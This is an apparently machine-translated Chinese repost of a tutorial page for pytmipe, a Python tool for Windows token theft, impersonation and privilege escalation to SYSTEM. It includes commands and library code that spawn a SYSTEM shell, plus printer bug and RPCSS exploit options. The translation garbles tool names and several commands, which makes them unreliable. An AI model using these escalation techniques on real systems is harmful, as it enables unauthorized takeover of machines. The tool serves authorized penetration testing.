# pyt pipe:Python 库和客户端，用于 Windows 上权限提升的令牌操作和模拟

> 原文：<https://kalilinuxtutorials.com/pytmipe/>

[![Pytmipe : Python Library And Client For Token Manipulations & Impersonations For Privilege Escalation On Windows](img/06e3c0377dafb7c7bc066474bc8ee399.png "Pytmipe : Python Library And Client For Token Manipulations & Impersonations For Privilege Escalation On Windows")](https://1.bp.blogspot.com/-xIwNOnZ4gi0/X8_YeUR90qI/AAAAAAAAIFs/BJhHBjVv8h8eYh86LAWldw9whxhT2P6sACLcBGAsYHQ/s728/Pytmipe.png)

**pyt pipe**(用于令牌操作和特权提升模拟的 PYthon 库)是一个 Python 3 库，用于操作 Windows 令牌和管理模拟以便在 Windows 上获得更多特权。**t pipe**是使用*pyt pipe*库的 python 3 客户端。

**内容**

*   一个 **python 客户端**:*tmipe*(*python 3 tmipe . py*)
*   一个 **python 库**:*pyt pipe*。用于将此项目包含在另一个项目中
*   **pytinstaller 示例**，用于获得**的独立**exe

**文档**

*   幻灯片“Windows 令牌操作、模拟和权限提升”(英文):[链接](https://github.com/quentinhardy/pytmipe/blob/master/doc/Windows_Tokens_Impersonation_PE_Quentin_HARDY_2020_v1.0.pdf)
*   MISC 112 中的文章(法语):[链接](https://connect.ed-diamond.com/MISC/MISC-112/Manipulation-de-tokens-impersonation-et-elevation-de-privileges)

**主要特点**

| 方法 | 所需的权限 | 操作系统(非详尽) | 直接目标(最大) |
| --- | --- | --- | --- |
| 令牌创建和模拟 | 用户名和密码 | 全部 | 本地管理员 |
| 代币假冒/盗窃 | *SeDebugPrivilege* | 全部 | *nt 权限\系统* |
| 父 PID 欺骗(句柄继承) | *SeDebugPrivilege* | > = Vista | *nt 权限\系统* |
| 服务(供应链管理) | 本地管理员(如果启用了 UAC，则为高完整性级别) | 全部 | *nt 权限\系统*或域账户 |
| WMI 事件 | 本地管理员(如果启用了 UAC，则为高完整性级别) | 全部 | *nt 权限\系统* |
| 打印机臭虫 LPE | *SeImpersonatePrivilege* (服务账户) | Windows 8.1、10 和 Server 2012R2/2016/2019 | *nt 权限\系统* |
| LPE RPCSS 服务公司 | *SeImpersonatePrivilege* (服务账户) | Windows 10 和 Server 2016/2019 | *nt 权限\系统* |

**能力**

下面的**非穷举**列表显示了在*pyt pipe*库中实现的一些特性:

*   令牌和权限管理:
    *   获取、启用或禁用当前或远程线程的令牌特权
    *   获取本地或远程令牌信息
    *   获取当前线程的有效令牌(模拟或主令牌)
*   获取有关选定令牌的许多信息:
    *   提升类型、模拟类型、带详细信息的链接令牌、SID、ACL、默认组、主要组、所有者、权限、源
    *   等等
*   **列出当前线程可访问的所有令牌**(主&模拟令牌):
    *   实现了 2 种不同的方法:“线程”方法和**“句柄”**方法(收藏夹)
    *   检查令牌是否可以被模拟
    *   获取有关每个令牌的信息(提升类型、模拟类型、链接令牌、SID 等)
    *   获取可通过帐户名(SID)访问的所有令牌
*   模拟令牌或用户:
    *   制作令牌并模拟(需要用户的凭据)
    *   令牌模拟/窃取(需要特定权限):模拟选定的令牌
    *   用令牌创建进程(需要特定的特权):模拟一个选择的令牌并创建新的进程
    *   **冒充第一个 *nt 授权\系统*令牌**找到
    *   用 pid 模拟远程进程的主令牌
*   升级方法:
    *   **父 PID 欺骗**–处理继承
    *   通过直接命令或命名管道模拟的服务管理器:本地管理员到 *nt authority\system* (或其他特权帐户)
    *   通过直接命令或命名管道模拟的任务调度程序:本地管理员到 *nt authority\system*
    *   通过直接命令或命名管道模拟的 WMI 作业:本地管理员到 *nt authority\system*
    *   **打印机 Bug**:*SeImpersonatePrivilege*to*nt authority \ system*
    *   **RPCSS** : *天皇个人权限*至*台当局\系统*
    *   通过任务调度和命名管道模拟重新启用特权

**依赖关系**

*ctypes* 使用次数最多。为了更好的可移植性， *pywin32* 的许多特性都在 pytmipe 中进行了重新开发，以避免使用 *pywin32* 。然而，任务调度器模块仍然由于时间不足而使用 *pywin32* (更准确地说是 *pythoncom* )。所有其他模块仅使用 ctypes。

**如何使用？**

对于 **python 客户端**(名为 *tmipe* ):

```
python.exe tmipe.py -h
usage: tmipe.py [-h] [--version]
                {cangetadmin,printalltokens,printalltokensbyname,printalltokensbypid,printsystemtokens,searchimpfirstsystem,imppid,imptoken,printerbug,rpcss,spoof,impuser,runas,scm}
                ...

                      **
    888888  8b    d8  88  88""Yb  888888
      88    88b  d88  88  88__dP  88__
      88    88YbdP88  88  88"""   88""
      88    88 YY 88  88  88      888888
-------------------------------------------
Token Manipulation, Impersonation and
     Privilege Escalation (Tool)
-------------------------------------------
By Quentin HARDY (quentin.hardy@protonmail.com)

positional arguments:
  {cangetadmin,printalltokens,printalltokensbyname,printalltokensbypid,printsystemtokens,searchimpfirstsystem,imppid,imptoken,printerbug,rpcss,spoof,impuser,runas,scm}

                         Choose a main command
    cangetadmin          Check if user can get admin access
    printalltokens       Print all tokens accessible from current thread
    printalltokensbyname
                         Print all tokens accessible from current thread by account name
    printalltokensbypid  Print all tokens accessible from current thread by pid
    printsystemtokens    Print all system tokens accessible from current
    searchimpfirstsystem
                         search and impersonate first system token
    imppid               impersonate primary token of selected pid and try to spawn cmd.exe
    imptoken             impersonate primary or impersonation token of selected pid/handle and try to spawn cmd.exe
    printerbug           exploit the "printer bug" for getting system shell
    rpcss                exploit "rpcss" for getting system shell
    spoof                parent PID Spoofing ("handle inheritance)"
    impuser              create process with creds with impersonation
    runas                create process with creds as runas
    scm                  create process with Service Control Manager

optional arguments:
  -h, --help             show this help message and exit
  --version              show program's version number and exit
```

对于 **python 库**(名为*pyt pipe*)，参见源代码和示例。通常，我会很好地记录源代码…大部分功能都有记录。

关于 **pyinstaller 示例**和独立版本，参见 *src/examples/* 文件夹中的文件。

**例题**

如果你想知道如何使用 *pytimpe* 库，请看 *src/examples* 文件夹中的许多例子。

*   **例 1:获取 *nt 权限\系统***

冒充第一个*系统*令牌，从 python 客户端( *tmipe* )得到 cmd.exe 提示为*系统*:

**python . exe tmpe . py 搜索疫苗系统-vv**

要直接通过*pyt pipe*库做同样的事情，请参见*src/examples/searchandinpersonatefirsystemtoken . py*:

**from Impersonate Impersonate
from utils import configure logging

configure logging()
imp = Impersonate()
imp . searchandinpersonatefirstsystemtoken(target PID = None，printAllTokens=False)**

如果当前的 Windows 用户拥有所需的权限，它将打开一个 cmd.exe 提示符作为*系统*。

当然，从这个源代码中，你可以用 *pyinstaller* 创建一个独立的 exe。

*   **例 2:获取代币**

要获取当前进程中使用的主令牌和模拟令牌:

**python.exe tmipe . py printalltokes–当前–完整–链接**

*   **输出:**

```
- PID: 3212
------------------------------
  - PID: 3212
  - type: Primary (1)
  - token: 764
  - hval: None
  - ihandle: None
  - sid: S-1-5-18
  - accountname: {'Name': 'SYSTEM', 'Domain': 'NT AUTHORITY', 'type': 1}
  - intlvl: System
  - owner: S-1-5-32-544
  - Groups:
    - S-1-5-32-544: {'Name': 'Administrators', 'Domain': 'BUILTIN', 'type': 4} (ENABLED, ENABLED_BY_DEFAULT, OWNER)
    - S-1-1-0: {'Name': 'Everyone', 'Domain': '', 'type': 5} (ENABLED, ENABLED_BY_DEFAULT, MANDATORY)
    - S-1-5-11: {'Name': 'Authenticated Users', 'Domain': 'NT AUTHORITY', 'type': 5} (ENABLED, ENABLED_BY_DEFAULT, MANDATORY)
    - S-1-16-16384: {'Name': 'System Mandatory Level', 'Domain': 'Mandatory Label', 'type': 10} (INTEGRITY_ENABLED, INTEGRITY)
  - Privileges (User Rights):
    - SeAssignPrimaryTokenPrivilege: Enabled
    [...]
    - SeTrustedCredManAccessPrivilege: Enabled
  - issystem: True
  - sessionID: 1
  - elevationtype: Default (1)
  - iselevated: True
  - Linked Token: None
  - tokensource: b'*SYSTEM*'
  - primarysidgroup: S-1-5-18
  - isrestricted: False
  - hasrestricitions: True
  - Default DACL:
    - {'ace_type': 'ALLOW', 'ace_flags': '', 'rights': '0x10000000', 'object_guid': '', 'inherit_object_guid': '', 'account_sid': 'S-1-5-18'}
    - {'ace_type': 'ALLOW', 'ace_flags': '', 'rights': '0xa0020000', 'object_guid': '', 'inherit_object_guid': '', 'account_sid': 'S-1-5-32-544'}
  [...]
  - Mandatory Policy: NO_WRITE_UP
```

用于获取可从当前线程访问的所有令牌，由 pid 组织，仅当模拟可能时:

```
python.exe tmipe.py printalltokensbypid --imp-only
```

*   **输出:**

```
[...]
- PID 4276:
        - S-1-5-18: NT AUTHORITY\SYSTEM (possible imp: True)
- PID 7252:
        - None
- PID 1660:
        - S-1-5-21-28624056-3392308708-440876048-1106: DOMAIN\USER (possible imp: True)
        - S-1-5-20: NT AUTHORITY\NETWORK SERVICE (possible imp: True)
        - S-1-5-18: NT AUTHORITY\SYSTEM (possible imp: True)
        - S-1-5-90-0-1: Window Manager\DWM-1 (possible imp: True)
        - S-1-5-19: NT AUTHORITY\LOCAL SERVICE (possible imp: True)
[...]
```

如果你想用*pyt pipe*库来做这个操作，也很容易:

```
from impersonate import Impersonate
from utils import configureLogging

configureLogging()
imp = Impersonate()
imp.printAllTokensAccessible(targetPID=None, printFull=True, printLinked=True, _useThreadMethod=False)
```

*   **示例 3:模拟令牌**

您可以模拟选定的令牌。

第一步，根据您的过滤器获取所有令牌(*系统*令牌和当前线程可以模拟的令牌):

**python.exe tmipe . py printalltokens–filter { \ " sid \ ":\ " S-1-5-18 \ "，\"canimpersonate\":true}**

**输出:**

```
[...]
- PID: 2288
------------------------------
  - PID: 2288
  - type: Impersonation (2)
  - token: 2504
  - ihandle: 118
  - sid: S-1-5-18
  - accountname: {'Name': 'SYSTEM', 'Domain': 'NT AUTHORITY', 'type': 1}
  - intlvl: System
  - owner: S-1-5-18
  - issystem: True
  - elevationtype: Default (1)
  - iselevated: True
  - linkedtoken: None
  - implevel: Impersonate (2)
  - appcontainertoken: False
  [...]
  - primarysidgroup: S-1-5-18
  - isrestricted: False
  - hasrestricitions: True
  - Mandatory Policy: VALID_MASK
  - canimpersonate: True
[...]
```

前面的输出显示了位于 pid 2288 (ihandle 118)中的模拟令牌，它具有完整性级别 *system* 。可以使用以下命令模拟该特定令牌:

**python.exe tmipe . py imp token–PID 2288–I handle 118-vv**

前面的命令打开一个 cmd.exe 作为 *nt authority\system* 。

这也可以用*pyt pipe*库来完成。以下源代码模拟第一个可用的*系统*令牌，打印有效令牌并停止模拟:

```
from impersonate import Impersonate
from windef import TokenImpersonation

allTokens = imp.getTokensAccessibleFilter(targetPID=None,
                                          filter={'canimpersonate':True, 'sid':'S-1-5-18', 'type':TokenImpersonation},
                                          _useThreadMethod=False)
if allTokens == {} or allTokens==None:
    print("No one token found for impersonation")
else:
    pid = list(allTokens.keys())[0] #use the first token of the first pid returned in 'allTokens'
    firstIHandle = allTokens[pid][0]['ihandle']
    imp.printThisToken(allTokens, pid, firstIHandle)
    imp.impersonateThisToken(pid=pid, iHandle=firstIHandle)
    print("Current Effective token for current thread after impersonation:")
    imp.printCurrentThreadEffectiveToken(printFull=False, printLinked=False)
    imp.terminateImpersonation()
    print("Current Effective token for current thread (impersonation finished):")
    imp.printCurrentThreadEffectiveToken(printFull=False, printLinked=False)
```

[**Download**](https://github.com/quentinhardy/pytmipe)